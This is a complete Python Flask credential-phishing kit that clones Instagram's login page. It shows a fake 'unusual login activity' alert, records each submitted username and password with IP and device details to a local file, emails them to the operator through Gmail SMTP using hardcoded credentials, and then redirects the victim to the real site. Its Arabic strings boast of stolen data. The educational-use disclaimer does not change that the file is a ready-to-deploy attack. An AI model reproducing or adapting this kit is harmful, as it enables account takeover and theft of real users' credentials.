#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INSTAGRAM PHISHING MALWARE v6.3 - RENDER.COM DEPLOYMENT
# LEGAL DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED ACCESS IS ILLEGAL.

import os
import smtplib
from flask import Flask, request, redirect, session, render_template_string, jsonify
from datetime import datetime
from email.mime.text import MIMEText
from email.header import Header

app = Flask(__name__)
app.secret_key = os.urandom(24)
SENDER_EMAIL = "btahr9751@gmail.com"
RECEIVER_EMAIL = "btahr9751@gmail.com"
EMAIL_PASSWORD = "tgkevromqxsearau"
SMTP_SERVER = "smtp.gmail.com"
PORT = 587
LOG_FILE = "stolen_creds.txt"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        :root {
            --ig-blue: #0095f6;
            --ig-blue-hover: #1877f2;
            --ig-dark: #000;
            --ig-light: #fff;
            --ig-gray: #8e8e8e;
            --ig-border: #dbdbdb;
            --ig-bg: #fafafa;
            --ig-card: #fff;
            --ig-error: #ed4956;
            --ig-link: #00376b;
            --ig-success: #4CAF50;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: var(--ig-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .wrapper {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 350px;
        }
        
        .login-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            padding: 30px 40px;
            text-align: center;
            margin-bottom: 10px;
            position: relative;
        }
        
        .instagram-logo {
            margin: 15px auto 25px;
            height: 51px;
        }
        
        .alert-banner {
            background-color: #fff8db;
            border: 1px solid #e1e1e1;
            border-radius: 3px;
            padding: 14px;
            margin-bottom: 20px;
            text-align: center;
            color: #d93025;
            font-size: 14px;
        }
        
        .alert-banner strong {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .alert-banner p {
            margin: 8px 0;
            color: #262626;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        .form-control {
            width: 100%;
            padding: 10px 8px;
            background-color: var(--ig-bg);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            font-size: 12px;
            color: var(--ig-dark);
            margin-bottom: 8px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--ig-gray);
        }
        
        .btn-login {
            width: 100%;
            padding: 8px;
            background-color: var(--ig-blue);
            color: var(--ig-light);
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            opacity: 0.7;
        }
        
        .btn-login.active {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        
        .separator .line {
            flex: 1;
            height: 1px;
            background-color: var(--ig-border);
        }
        
        .separator .text {
            padding: 0 18px;
            color: var(--ig-gray);
            font-size: 13px;
            font-weight: 600;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 12px 0;
            display: block;
            text-decoration: none;
        }
        
        .fb-icon {
            font-size: 18px;
            margin-right: 6px;
            position: relative;
            top: 2px;
        }
        
        .forgot-pw {
            color: var(--ig-link);
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        
        .signup-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            padding: 20px;
            text-align: center;
            margin: 0 0 10px;
            font-size: 14px;
        }
        
        .signup-link {
            color: var(--ig-blue);
            font-weight: 600;
            text-decoration: none;
        }
        
        .download-box {
            text-align: center;
            padding: 15px 0;
        }
        
        .download-text {
            font-size: 14px;
            margin-bottom: 15px;
        }
        
        .download-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .badge {
            height: 40px;
        }
        
        .footer {
            width: 100%;
            padding: 20px 0;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        
        .footer-link {
            color: var(--ig-gray);
            font-size: 11px;
            text-decoration: none;
        }
        
        .copyright {
            color: var(--ig-gray);
            font-size: 11px;
            text-align: center;
        }
        
        .loading {
            display: none;
            margin: 15px auto;
            text-align: center;
        }
        
        .spinner {
            border: 3px solid rgba(0,149,246,0.2);
            border-top: 3px solid var(--ig-blue);
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .security-notice {
            margin-top: 15px;
            color: var(--ig-gray);
            font-size: 11px;
            line-height: 1.4;
        }
        
        /* رسالة التأكيد */
        .confirmation {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            display: flex;
            align-items: center;
            gap: 10px;
            animation: fadeInOut 3s ease-in-out;
            opacity: 0;
        }
        
        .confirmation.success {
            background-color: var(--ig-success);
        }
        
        .confirmation.error {
            background-color: var(--ig-error);
        }
        
        .confirmation-icon {
            font-size: 20px;
        }
        
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(-20px); }
            20% { opacity: 1; transform: translateY(0); }
            80% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(-20px); }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo" width="174">
            
            <div class="alert-banner">
                <strong>Security Alert</strong>
                <p>We detected unusual login activity from a new device in <b>Dubai, UAE</b>.</p>
                <p>Please verify your identity to secure your account.</p>
            </div>
            
            <form id="loginForm" method="POST">
                <div class="form-group">
                    <input type="text" name="username" class="form-control" placeholder="Phone number, username, or email" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                
                <button type="submit" class="btn-login" id="loginBtn">Log in</button>
            </form>
            
            <div class="separator">
                <div class="line"></div>
                <div class="text">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">
                <span class="fb-icon">&#xf09a;</span> Log in with Facebook
            </a>
            
            <a href="#" class="forgot-pw">Forgot password?</a>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Verifying your information...</p>
            </div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="download-box">
            <p class="download-text">Get the app.</p>
            <div class="download-badges">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="badge">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="badge">
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Meta</a>
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Blog</a>
                <a href="#" class="footer-link">Jobs</a>
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">API</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Locations</a>
                <a href="#" class="footer-link">Instagram Lite</a>
            </div>
            <div class="copyright">
                English (UK) © 2024 Instagram from Meta
            </div>
        </div>
    </div>
    
    <!-- رسالة تأكيد الإرسال -->
    <div id="confirmationMessage" class="confirmation" style="display: none;">
        <span class="confirmation-icon"></span>
        <span class="confirmation-text"></span>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const username = document.querySelector('input[name="username"]');
            const password = document.querySelector('input[name="password"]');
            const loginBtn = document.getElementById('loginBtn');
            const form = document.getElementById('loginForm');
            const loading = document.getElementById('loading');
            const confirmationMessage = document.getElementById('confirmationMessage');
            
            function checkInputs() {
                if (username.value.trim() !== '' && password.value.trim() !== '') {
                    loginBtn.classList.add('active');
                } else {
                    loginBtn.classList.remove('active');
                }
            }
            
            username.addEventListener('input', checkInputs);
            password.addEventListener('input', checkInputs);
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show loading animation
                form.style.opacity = '0.5';
                form.style.pointerEvents = 'none';
                loading.style.display = 'block';
                
                // Send credentials to server
                const formData = new FormData(form);
                
                fetch('/auth', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    // Show confirmation message
                    const message = confirmationMessage.querySelector('.confirmation-text');
                    const icon = confirmationMessage.querySelector('.confirmation-icon');
                    
                    if (data.email_sent) {
                        confirmationMessage.className = 'confirmation success';
                        message.textContent = 'تم إرسال البيانات بنجاح ✓';
                        icon.textContent = '✓';
                    } else {
                        confirmationMessage.className = 'confirmation error';
                        message.textContent = 'فشل إرسال البيانات ❌';
                        icon.textContent = '❌';
                    }
                    
                    // Show message
                    confirmationMessage.style.display = 'flex';
                    confirmationMessage.style.opacity = '1';
                    
                    // Hide after animation
                    setTimeout(() => {
                        confirmationMessage.style.opacity = '0';
                        setTimeout(() => {
                            confirmationMessage.style.display = 'none';
                        }, 1000);
                    }, 3000);
                    
                    // Redirect to Instagram after 3 seconds
                    setTimeout(() => {
                        window.location.href = data.redirect_url;
                    }, 3000);
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Redirect to Instagram in case of error
                    window.location.href = "https://www.instagram.com/accounts/login/?source=auth_switcher";
                });
            });
        });
    </script>
</body>
</html>
"""

def send_email(subject, body):
    try:
        # إنشاء رسالة البريد الإلكتروني
        msg = MIMEText(body, 'plain', 'utf-8')
        msg['Subject'] = Header(subject, 'utf-8')
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        
        # إرسال البريد عبر خادم Gmail
        server = smtplib.SMTP(SMTP_SERVER, PORT)
        server.starttls()
        server.login(SENDER_EMAIL, EMAIL_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"[!] SMTP Error: {str(e)}")
        return False

def log_credentials(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # إنشاء محتوى البريد الإلكتروني بالعربية
    log_entry = f"""
[{timestamp}] NEW CREDENTIALS CAPTURED
Username: {data['username']}
Password: {data['password']}
IP Address: {client_ip}
User Agent: {data['user_agent']}
Location: Dubai, UAE (Spoofed)
Device: {data['device']}
----------------------------------------------
"""
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    # موضوع ورسالة البريد الإلكتروني بالعربية
    subject = "✅ تم سرقة بيانات إنستغرام جديدة"
    body = f"""
🔥 تمت سرقة بيانات الدخول بنجاح - إصدار 6.3 🔥

التاريخ والوقت: {timestamp}
اسم المستخدم: {data['username']}
كلمة المرور: {data['password']}
عنوان IP: {client_ip}
معلومات المتصفح: {data['user_agent']}
نوع الجهاز: {data['device']}
النظام: Render.com ({os.environ.get('RENDER_EXTERNAL_URL', 'https://arifagcca-1.onrender.com')})

تمت السرقة بواسطة أداة RenderPhisher
"""
    
    # إرسال البريد وعودة حالة الإرسال
    return send_email(subject, body)

def detect_device(user_agent):
    if 'iPhone' in user_agent:
        return 'آيفون'
    elif 'Android' in user_agent:
        return 'أندرويد'
    elif 'Mac' in user_agent:
        return 'ماك'
    elif 'Windows' in user_agent:
        return 'ويندوز'
    else:
        return 'غير معروف'

@app.route('/')
def login():
    user_agent = request.headers.get('User-Agent', 'غير معروف')
    session['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    session['user_agent'] = user_agent
    session['device'] = detect_device(user_agent)
    return render_template_string(HTML_PAGE)

@app.route('/auth', methods=['POST'])
def auth():
    credentials = {
        'username': request.form.get('username'),
        'password': request.form.get('password'),
        'ip': session.get('client_ip', 'غير متوفر'),
        'user_agent': session.get('user_agent', 'غير معروف'),
        'device': session.get('device', 'غير معروف')
    }
    
    # تسجيل البيانات وإرسال البريد
    email_sent = log_credentials(credentials)
    
    # إرجاع حالة الإرسال كرد JSON
    return jsonify({
        'email_sent': email_sent,
        'redirect_url': "https://www.instagram.com/accounts/login/?source=auth_switcher"
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)